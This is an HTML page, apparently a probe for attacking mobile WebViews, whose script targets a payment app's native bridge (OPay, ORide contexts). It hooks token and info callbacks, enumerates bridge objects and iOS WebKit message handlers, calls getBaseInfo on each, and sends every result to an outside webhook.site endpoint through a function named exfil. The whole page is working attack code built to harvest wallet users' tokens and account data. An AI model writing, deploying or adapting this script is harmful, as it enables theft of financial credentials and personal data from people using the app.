<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ultimate Scanner v3</title>
</head>

<body
  style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
  <h1 id="status">SCANNING...</h1>
  <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>

  <script>
    (function () {
      var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
      var logDiv = document.getElementById('log');

      function report(msg, type) {
        var div = document.createElement('div');
        div.innerText = msg;
        logDiv.appendChild(div);
        new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&v=3&ts=' + Date.now();
      }

      function exfil(obj) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', WEBHOOK, true);
        xhr.send(JSON.stringify(obj));
        status.innerText = 'DATA CAPTURED';
      }

      report('V3 SCANNER ACTIVE');

      // 1. Massive callback registration
      var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage', 'opayCallback', 'onReceiveNativeMessage', 'handleNativeMessage'];
      callbacks.forEach(function (n) {
        window[n] = function (d) {
          report('CALLBACK HIT: ' + n, 'success');
          exfil({ source: 'callback', name: n, data: d });
        };
      });

      // 2. Automated Scan
      setTimeout(function () {
        report('Scanning window objects...');

        var suspects = [];
        for (var key in window) {
          try {
            if (key.toLowerCase().indexOf('opay') !== -1 || key.toLowerCase().indexOf('context') !== -1 || key.toLowerCase().indexOf('bridge') !== -1) {
              suspects.push(key);
            }
          } catch (e) { }
        }
        report('Suspects found: ' + suspects.join(', '));

        // Hit WebKit messageHandlers
        if (window.webkit && window.webkit.messageHandlers) {
          var handlers = Object.keys(window.webkit.messageHandlers);
          report('iOS Handlers: ' + handlers.join(', '));

          handlers.forEach(function (h) {
            try {
              report('Posting to: ' + h);
              window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
              window.webkit.messageHandlers[h].postMessage({ method: 'getBaseInfo', cb: 'onGetBaseInfo' });
            } catch (e) { report('Error ' + h + ': ' + e.message); }
          });
        }

        // Check direct bridges
        var targets = ['control', 'OPay3PartyContext', 'ORideContext', 'OPayContext'];
        targets.forEach(function (b) {
          if (window[b]) {
            report('Calling Bridge: ' + b);
            if (typeof window[b].getBaseInfo === 'function') {
              try {
                var res = window[b].getBaseInfo();
                report('Success calling ' + b, 'success');
                exfil({ source: 'direct', bridge: b, data: res });
              } catch (e) { report('Err calling ' + b + ': ' + e.message); }
            }
          }
        });

        report('Scan cycle complete');
      }, 1500);
    })();
  </script>
</body>

</html>